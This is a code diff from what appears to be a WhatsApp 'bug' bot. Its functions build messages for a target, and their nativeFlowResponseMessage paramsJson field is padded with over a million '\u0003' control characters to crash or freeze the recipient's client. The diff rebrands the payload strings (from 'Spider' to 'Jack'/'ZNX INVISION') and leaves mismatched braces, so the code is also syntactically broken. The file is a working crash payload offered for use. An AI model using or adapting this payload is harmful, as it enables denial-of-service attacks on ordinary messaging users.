@@ -492,7 +492,7 @@ async function ClPm(target, spider, cct = false, ptcp = false) {
    console.log(chalk.green("Send Bug By Spider-V9〽️"));
   };
 // Define the invisible function
-  const VisiX = {
+   const VisiX = {
    key: {
     remoteJid: 'p',
     fromMe: false,
@@ -506,12 +506,12 @@ async function ClPm(target, spider, cct = false, ptcp = false) {
      },
      "nativeFlowResponseMessage": {
       "name": "galaxy_message",
-      "paramsJson": {\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐒𝐩𝐢𝐝𝐞𝐫 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑‌𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 𝐓𝐑𝐀𝐒𝐇𝐄𝐑⧭‏⭑‌${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"},
+      "paramsJson": {\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑‌⟅ ༑ ▾ 𝐙‌𝐍‌𝐗 ⿻ 𝐈𝐍‌𝐕𝚫𝐒𝐈‌𝚯𝚴 ⿻ ▾ ༑‌⟆ ‌‌‌‌‌‌‏⭑‌${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"},
       "version": 3
      }
     }
    }
-  }
+	     } 
 async function InVisiXz(target, spider, cct = false, ptcp = false) {
    let etc = generateWAMessageFromContent(target,
     proto.Message.fromObject({
